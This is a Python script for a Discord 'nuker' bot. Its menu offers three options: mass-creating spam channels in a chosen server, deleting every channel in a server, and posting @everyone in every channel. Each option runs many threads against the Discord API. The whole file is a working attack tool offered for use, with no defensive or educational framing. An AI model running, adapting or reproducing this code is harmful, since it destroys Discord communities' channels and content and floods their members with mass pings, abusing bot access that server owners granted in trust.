import aiohttp
import asyncio
import threading
import os
import time

from discord.ext import commands

bot = commands.Bot(command_prefix=".")

#insert your token.
token = ""
headers = {'Authorization': f'Bot {token}'}

class Flic:
    def __init__(self):
        pass
        
    async def SpamChannels(self, guild, name):
        json = {'name': name, 'type': 0}
        async with aiohttp.ClientSession() as cs:
            try:
                await cs.post(f"https://discord.com/api/v8/guilds/{guild}/channels", headers=headers, json=json)
            except:
                pass

    async def DeleteChannels(self, channel):
        async with aiohttp.ClientSession() as cs:
            try:
                await cs.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            except:
                pass

    async def MassMention(self, channel):
        json = {"content" : "@everyone"}
        async with aiohttp.ClientSession() as cs:
            try:
                await cs.post(f"https://discord.com/api/v8/channels/{channel}/messages",headers=headers, json=json)
            except:
                pass
                
    async def SpamChannelsExecute(self):
        guild = input("Enter Guild ID: ")
        name = input("Enter Channel name: ")
        limit = input("Enter Spam limit: ")
        [threading.Thread(target=asyncio.run, args=(self.SpamChannels(guild, name),)).start() for _ in range(int(limit))]

            
    async def DeleteChannelsExecute(self):
        guild = input("Enter Guild ID: ")
        channels = bot.get_guild(int(guild)).channels
        [threading.Thread(target=asyncio.run, args=(self.DeleteChannels(channel),)).start() for channel in [int(channel.id) for channel in channels]]

    async def MassMentionExecute(self):
        guild = input("Enter Guild ID: ")
        channels = bot.get_guild(int(guild)).channels
        [threading.Thread(target=asyncio.run, args=(self.MassMention(channel),)).start() for channel in [int(channel.id) for channel in channels]]

    async def main(self):
        print("Spam Channel - 1")
        print("Delete Channels - 2")
        print("Mass Mention - 3")
        option = input("Enter option: ")
        if option == "1":
            await self.SpamChannelsExecute()
            await asyncio.sleep(3)
            os.system("cls")
        elif option == "2":
            await self.DeleteChannelsExecute()
            await asyncio.sleep(3)
            os.system("cls")
        elif option == "3":
            await self.MassMentionExecute()
            await asyncio.sleep(3)
            os.system("cls")
        await self.main()
            
@bot.event
async def on_ready():
    await Flic().main()
    
bot.run(token)
